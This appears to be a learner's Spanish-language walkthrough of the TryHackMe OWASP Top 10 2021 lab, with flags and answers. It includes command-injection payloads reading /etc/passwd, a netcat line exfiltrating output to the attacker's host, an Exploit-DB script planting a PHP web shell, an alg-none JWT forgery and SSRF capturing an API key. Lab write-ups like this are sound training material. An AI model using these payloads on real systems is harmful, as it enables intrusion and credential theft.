https://tryhackme.com/r/room/owasptop102021


## Task 1 - Introduction

## Task 2 Accessing Machines

##  Task 3 Broken Access Control

##  Task 4 Broken Access Control (IDOR Challenge)

##  Task 5 2. Cryptographic Failures

##  Task 6 Cryptographic Failures (Supporting Material 1)

- Tenemos que entender como abrir una base de datos sqllite , explorarla y ver su contenido
```
sqlite3 example.db

sqlite> .tables
sqlite> pragma table_info(customers;
sqlite> select * from customers;
```

## Task 7 Cryptographic Failures (Supporting Material 2)
- aveces los passwords estan almacenados como hashes, los podremos crackear
https://crackstation.net/

## Task 8 Cryptographic Failures (Challenge)

#### What is the name of the mentioned directory?

assets

- ir al sitio a la pagina de login, ver el codigo fuente
```
http://10.10.173.110:81/login.php
<!-- Must remember to do something better with the database than store it in /assets... -->
```

#### Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data? 

webapp.db

- ir al directorio
http://10.10.173.110:81/assets/
- descargar la base de datos
http://10.10.173.110:81/assets/webapp.db


#### Use the supporting material to access the sensitive data. What is the password hash of the admin user?

	6eea9b7ef19179a06954edd0f6c05ceb

- Mostramos los hashes

```
┌──(kali㉿kali)-[~/tryhackme/owasptopten2021]
└─$ sqlite3 webapp.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
sessions  users   
sqlite> pragma table_info(users);
0|userID|TEXT|1||1
1|username|TEXT|1||0
2|password|TEXT|1||0
3|admin|INT|1||0
sqlite> select * from users;
4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0
sqlite> .exit

```

#### Crack the hash. What is the admin's plaintext password?
	qwertyuiop

- crackeamos los hashes en crackstatsion
```
6eea9b7ef19179a06954edd0f6c05ceb qwertyuiop
ad0234829205b9033196ba818f7a872b test2
ad0234829205b9033196ba818f7a872b X
```



#### Log in as the admin. What is the flag?

	THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}

- Nos logueamos como admin:
http://10.10.173.110:81/login.php

admin
qwertyuiop

```
Welcome, admin
menu

Well done.
Your flag is: THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}
```

##  Task 9 - 3. Injection 

- SQL injection
- Command Injection

##  Task 10 3.1. Command Injection

- vamos al sitio


- existe una inyecion de comando que podemos aprovechar
```php
<?php
    if (isset($_GET["mooing"])) {
        $mooing = $_GET["mooing"];
        $cow = 'default';

        if(isset($_GET["cow"]))
            $cow = $_GET["cow"];
        
        passthru("perl /usr/bin/cowsay -f $cow $mooing");
    }
?>
```

#### What strange text file is in the website's root directory?
	drpepper.txt

- cuaquier comando enclosado se ejecuta
```
┌──(kali㉿kali)-[/usr/games]
└─$ echo "hola $(whoami)"                   
hola kali

```
 - abusamos de eso y en la interfaz ejecutamos comandos para dar con la bandera
```
$(ls)
css drpepper.txt index.php js

$(cat drpepper.txt)
_________________________________________ 
/ I'm sorry Mario, but the Dr. Pepper you \
\ are looking for is in another webapp.   /
 ----------------------------------------- 
```

#### How many non-root/non-service/non-daemon users are there?

- cuentas que no sean ni root, ni de servicio, ni demonios
	0

```
;grep -v "nologin" /etc/passwd

```

#### What user is this app running as?
	apache

```
$(whoami)
apache
```

#### What is the user's shell set as?

	/sbin/nologin

```
; grep 'apache' /etc/passwd
apache:x:100:101:apache:/var/www:/sbin/nologin
```

#### What version of Alpine Linux is running?
	3.16.0

```
; cat /etc/os-release
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.16.0
PRETTY_NAME="Alpine Linux v3.16"
HOME_URL="https://alpinelinux.org/"
BUG_REPORT_URL="https://gitlab.alpinelinux.org/alpine/aports/-/issues"
                    
```

#### EXTRA

```
;ls | nc 10.6.13.236 1433


> kali
while true ; do nc -lnvp 1433 ; done
```
##  Task 11 4. Insecure Design


- un reseteo de login con un pin de 6 digitos
	- se bloquea a los 3 intentos desde 1 ip
	- pero si se manda de varias ips se puede bypassear

- Vamos a la pagina y probamos colores de pregunta secreta para el password de 
Navigate to [http://10.10.4.17:85](http://10.10.4.17:85)

**Security Question**
Whats your favorite colour? green
**Success:** The password for user joseph has been reset to frexdJRE3w0gmA

- login con los datos
joseph
frexdJRE3w0gmA
- ver en las notas

THM{Not_3ven_c4tz_c0uld_sav3_U!}

## Task 12 - 5. Security Misconfiguration

#### Navigate to [http://10.10.4.17:86/console](http://10.10.4.17:86/console) to access the Werkzeug console.

- vamos a la consola, tecleamos algo de pyton para probar
http://10.10.4.17:86/console
```
[console ready]
>>> print('hola mundo')
hola mundo
>>> 
```

#### What is the database file name (the one with the .db extension) in the current directory?

	todo.db

```
>>> import os; print(os.popen("ls -l").read())
total 24
-rw-r--r--    1 root     root           249 Sep 15  2022 Dockerfile
-rw-r--r--    1 root     root          1411 Feb  3  2023 app.py
-rw-r--r--    1 root     root           137 Sep 15  2022 requirements.txt
drwxr-xr-x    2 root     root          4096 Sep 15  2022 templates
-rw-r--r--    1 root     root          8192 Sep 15  2022 todo.db
```

#### Modify the code to read the contents of the `app.py` file, which contains the application's source code. What is the value of the `secret_flag` variable in the source code?

	THM{Just_a_tiny_misconfiguration}

```
>>> import os; print(os.popen("cat app.py").read())
import os
from flask import Flask, render_template, request, redirect, url_for
from flask_sqlalchemy import SQLAlchemy

secret_flag = "THM{Just_a_tiny_misconfiguration}"

PROJECT_ROOT = os.path.dirname(os.path.realpath(__file__))
DATABASE = os.path.join(PROJECT_ROOT, 'todo.db')

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:////" + DATABASE
db = SQLAlchemy(app)


class Todo(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(80))
    complete = db.Column(db.Boolean)


@app.route("/")
def index():
    todo_list = Todo.query.all()
    return render_template("index.html", todo_list=todo_list)


@app.route("/add", methods=["POST"])
def add():
    title = request.form.get("title")
    new_todo = Todo(title=title, complete=False)
    db.session.add(new_todo)
    db.session.commit()
    return redirect(url_for("index"))


@app.route("/complete/<string:todo_id>")
def complete(todo_id):
    todo = Todo.query.filter_by(id=todo_id).first()
    todo.complete = not todo.complete
    db.session.commit()
    return redirect(url_for("index"))


@app.route("/delete/<string:todo_id>")
def delete(todo_id):
    todo = Todo.query.filter_by(id=todo_id).first()
    db.session.delete(todo)
    db.session.commit()
    return redirect(url_for("index"))


if __name__ == "__main__":
    db.create_all()
    app.run(host='0.0.0.0', port=5000, debug=True)

```

## Task 13 - 6. Vulnerable and Outdated Components

## Task 14 - Vulnerable and Outdated Components - Exploit

## Task 15 Vulnerable and Outdated Components - Lab

#### Navigate to [http://10.10.4.17:84](http://10.10.4.17:84) where you'll find a vulnerable application. All the information you need to exploit it can be found online. 

Answer the questions below

#### What is the content of the /opt/flag.txt file?

	THM{But_1ts_n0t_my_f4ult!}
	
- Google > CSE bookstore
	- https://www.exploit-db.com/exploits/47887
```
┌──(kali㉿kali)-[~/tryhackme/owasptopten2021]
└─$ python3 47887.py         
usage: 47887.py [-h] url
47887.py: error: the following arguments are required: url
                                                                                         
┌──(kali㉿kali)-[~/tryhackme/owasptopten2021]
└─$ python3 47887.py http://10.10.4.17:84/
> Attempting to upload PHP web shell...
> Verifying shell upload...
> Web shell uploaded to http://10.10.4.17:84/bootstrap/img/4G9ZhIbRAR.php
> Example command usage: http://10.10.4.17:84/bootstrap/img/4G9ZhIbRAR.php?cmd=whoami
> Do you wish to launch a shell here? (y/n): y
RCE $ id
uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)

RCE $ ls
4G9ZhIbRAR.php
android_studio.jpg
beauty_js.jpg
c_14_quick.jpg
c_sharp_6.jpg
doing_good.jpg
img1.jpg
img2.jpg
img3.jpg
kotlin_250x250.png
logic_program.jpg
mobile_app.jpg
pro_asp4.jpg
pro_js.jpg
unnamed.png
web_app_dev.jpg

RCE $ cat /opt/flag.txt
THM{But_1ts_n0t_my_f4ult!}

RCE $ 

```

## Task 16 - 7. Identification and Authentication Failures

## Task 17 - Identification and Authentication Failures Practical

#### What is the flag that you found in darren's account?

	fe86079416a21a3c99937fea8874b667

http://10.10.4.17:8088

- intentamos registrar al usuario darren, dira que ya existe
- lo registramos con un espacio en el nombre ' darren', luego podremos ver la bandera cuando nos loguemos
	- fe86079416a21a3c99937fea8874b667

#### Now try to do the same trick and see if you can log in as arthur.  

#### What is the flag that you found in arthur's account?
	d9ac0f7db4fda460ac3edeb75d75e16e


## Task 18 - 8. Software and Data Integrity Failures

## Task 19 - Software Integrity Failures

#### What is the SHA-256 hash of `https://code.jquery.com/jquery-1.12.4.min.js`?

	ha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=

- vamos al sitio> https://www.srihash.org/
- pedimos el hash sha-256 > 
```
<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
```

## Task 20 - Data Integrity Failures

#### Navigate to [http://10.10.4.17:8089/](http://10.10.4.17:8089/) and follow the instructions in the questions below.

#### Try logging into the application as guest. What is guest's account password?

	guest

- intentamos con cualquiera y nos brindara entrar con: guest, guest



#### What is the name of the website's cookie containing a JWT token?

- vemos la cookie con el cookie editor

	jwt-session

#### Use the knowledge gained in this task to modify the JWT token so that the application thinks you are the user "admin".

- usamos el sitio> https://appdevtools.com/base64-encoder-decoder
- decodificamos la cookie original
- Ponemos alg: none y username : admin
- Recodificamos
- vamos al inspector , apartado storage, cookies, reemplazamos el valor de la cookie

```

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzMwODY0ODYxfQ.VuPEaCYb2gsi1QpkU3wtjt-Bi2awmIAoSKeDeDuJxmU

{"typ":"JWT","alg":"HS256"}
{"username":"guest","exp":1730864861}
VãÄh&Ú"Õ
dS|-߁f°(H§x;Æe



{"typ":"JWT","alg":"none"}
{"username":"admin","exp":1730864861}

eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzMwODY0ODYxfQ==.
```

#### What is the flag presented to the admin user?

THM{Dont_take_cookies_from_strangers}


## Task 2 - 19. Security Logging and Monitoring Failures


#### What IP address is the attacker using?

	49.99.13.16

- Descargamos el archivo de los logs


```
┌──(kali㉿kali)-[~/tryhackme/owasptopten2021]
└─$ cat login-logs_1595366583422.txt 
200 OK           12.55.22.88 jr22          2019-03-18T09:21:17 /login
200 OK           14.56.23.11 rand99        2019-03-18T10:19:22 /login
200 OK           17.33.10.38 afer11        2019-03-18T11:11:44 /login
200 OK           99.12.44.20 rad4          2019-03-18T11:55:51 /login
200 OK           67.34.22.10 bff1          2019-03-18T13:08:59 /login
200 OK           34.55.11.14 hax0r         2019-03-21T16:08:15 /login
401 Unauthorised 49.99.13.16 admin         2019-03-21T21:08:15 /login
401 Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login
401 Unauthorised 49.99.13.16 anonymous     2019-03-21T21:08:25 /login
401 Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login 

49.99.13.16
```

#### What kind of attack is being carried out?

	brute force

## Task 22 - 10. Server-Side Request Forgery (SSRF)

#### Navigate to [http://10.10.4.17:8087/](http://10.10.4.17:8087/)

#### Explore the website. What is the only host allowed to access the admin area?
		localhost

- si vamos a > http://10.10.4.17:8087/admin
```
Admin interface only available from localhost!!!
```


#### Check the "Download Resume" button. Where does the server parameter point to?

		secure-file-storage.com

http://10.10.4.17:8087/download?server=secure-file-storage.com:8087&id=75482342

#### Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request?

		THM{Hello_Im_just_an_API_key}

```
http://10.10.4.17:8087/download?server=10.6.13.236:8087&id=75482342


┌──(kali㉿kali)-[~/tryhackme/owasptopten2021]
└─$ nc -lnvp 8087      
listening on [any] 8087 ...
connect to [10.6.13.236] from (UNKNOWN) [10.10.4.17] 48210
GET /public-docs-k057230990384293/75482342.pdf HTTP/1.1
Host: 10.6.13.236:8087
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: */*
X-API-KEY: THM{Hello_Im_just_an_API_key}



```


#### Extra

10.10.4.17:8087/download?server=localhost:8087/admin&id=75482342
10.10.4.17:8087/download?server=localhost:8087/admin#&id=75482342
10.10.4.17:8087/download?server=localhost:8087/admin%23&id=75482342


The flag is thm{c4n_i_haz_flagz_plz?}


